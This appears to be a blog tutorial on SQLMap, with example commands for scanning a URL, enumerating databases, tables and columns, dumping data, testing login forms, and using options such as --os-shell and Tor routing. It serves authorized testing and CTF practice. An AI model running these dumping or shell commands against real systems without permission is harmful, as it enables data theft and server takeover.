# SQLMap: Automating SQL Injection Testing
SQLMap is a powerful open-source tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications. It can enumerate databases, extract data, and even take over database servers if misconfigured. In this post, we’ll cover SQLMap basics, common usage scenarios, and practical examples for ethical testing and CTF challenges.

Always use SQLMap responsibly on systems you have permission to test.

## Table of Contents
- [Installation](#installation)
- [Basic Usage](#basic-usage)
- [Database Enumeration](#database-enumeration)
- [Dumping Data](#dumping-data)
- [Advanced Options](#advanced-options)
- [Practical Examples](#practical-examples)
- [Tips and Best Practices](#tips-and-best-practices)

## Installation

SQLMap is Python-based and can be installed easily:


# Linux/macOS

git clone [https://github.com/sqlmapproject/sqlmap.git](https://github.com/sqlmapproject/sqlmap.git)
cd sqlmap
python3 sqlmap.py --help

# Windows

Download the latest release from [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)



## Basic Usage

Scan a URL for SQL injection vulnerabilities:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" --batch

```

Flags explained:  
- `-u`: Target URL  
- `--batch`: Non-interactive mode using default options  

## Database Enumeration

List available databases on a vulnerable target:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" --dbs

```

List tables in a specific database:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" -D database_name --tables

```

List columns in a table:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" -D database_name -T table_name --columns

```

## Dumping Data

Extract data from specific columns:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" -D database_name -T table_name -C column1,column2 --dump

```

Dump the entire table:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" -D database_name -T table_name --dump

```

## Advanced Options

- `--os-shell`: Get an interactive OS shell if the database allows it  
- `--tor --tor-type=SOCKS5`: Route requests through Tor for anonymity  
- `--risk=3 --level=5`: Increase testing depth and potential attack vectors  

## Practical Examples

1. Scan a URL for blind SQL injection:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" --technique=BEUSTQ --batch

```

2. Dump all data from a database:

```

python3 sqlmap.py -u "[http://example.com/page?id=1](http://example.com/page?id=1)" -D target_db --dump

```

3. Test login forms:

```

python3 sqlmap.py -u "[http://example.com/login](http://example.com/login)" --data="username=admin&password=pass" --batch

```

## Tips and Best Practices

- Only test systems you are authorized to scan.  
- Start with low-risk options before using aggressive features.  
- Use `--batch` for automated testing in CTFs or scripts.  
- Combine SQLMap with other tools like Burp Suite for better results.  
- Keep SQLMap updated to use the latest detection techniques.
